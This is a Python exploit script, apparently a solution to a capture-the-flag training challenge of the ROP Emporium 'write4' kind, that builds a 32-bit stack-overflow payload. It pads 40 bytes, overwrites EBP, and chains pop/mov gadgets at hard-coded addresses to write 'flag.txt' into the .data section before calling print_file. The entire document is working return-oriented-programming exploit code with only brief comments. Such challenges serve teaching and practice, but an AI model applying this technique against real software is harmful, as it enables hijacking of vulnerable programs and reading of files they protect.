#!/usr/bin/env python

# padding: 40 bytes

import struct
import sys

padding_len = 40 #until just before ebp is overwritten

ebp = struct.pack("I", 0xc000ffee) #just something recognizable so I'm sure the offset is right

print_file = struct.pack("I", 0x080483d0) # print_file(char*)
mov_edi_ebp = struct.pack("I", 0x08048543) # mov [edi], ebp; ret
pop_edi_ebp = struct.pack("I", 0x080485aa) # pop edi; pop ebp; ret
pop_ebp = struct.pack("I", 0x080485ab) # pop ebp; ret

filename_loc_raw = 0x0804a018 #.data
filename_loc1 = struct.pack("I", filename_loc_raw)
filename_loc2 = struct.pack("I", filename_loc_raw+4)
filename = b"flag.txt"

payload = b'A'*padding_len
payload += ebp
payload += pop_edi_ebp
payload += filename_loc1
payload += filename[:4]
payload += mov_edi_ebp
payload += pop_edi_ebp
payload += filename_loc2
payload += filename[4:8] 
payload += mov_edi_ebp
payload += print_file
payload += pop_ebp
payload += filename_loc1

sys.stdout.buffer.write(payload)
